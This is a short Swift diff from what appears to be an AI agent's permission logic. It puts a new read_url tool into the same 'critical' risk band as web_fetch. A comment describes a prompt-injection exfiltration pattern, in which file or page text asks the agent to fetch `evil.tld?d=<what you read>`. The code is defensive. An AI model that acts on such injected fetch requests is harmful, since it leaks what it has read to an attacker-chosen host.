@@ -95,9 +95,12 @@ extension ActionBand {
             return newFileBand(facts)
         case NativeTool.sheetWrite.rawValue:
             return facts.rangeHasValues == false ? .act : .critical
-        case NativeTool.webFetch.rawValue:
+        case NativeTool.webFetch.rawValue, NativeTool.readURL.rawValue:
             // Read, then fetch: text in a file or a page can ask for
             // `evil.tld?d=<what you read>`. In QA a critical band is the finger.
+            // read_url is the same egress as web_fetch (the address goes out and
+            // the host is chosen by the page), not the web_search class, whose
+            // query goes to a fixed provider.
             return facts.cleanTurn || facts.hostSaid ? .act : .critical
         case ParentTool.openURL.rawValue:
             // Opening an http(s) address is navigation; the scheme check lives in `httpURL`.
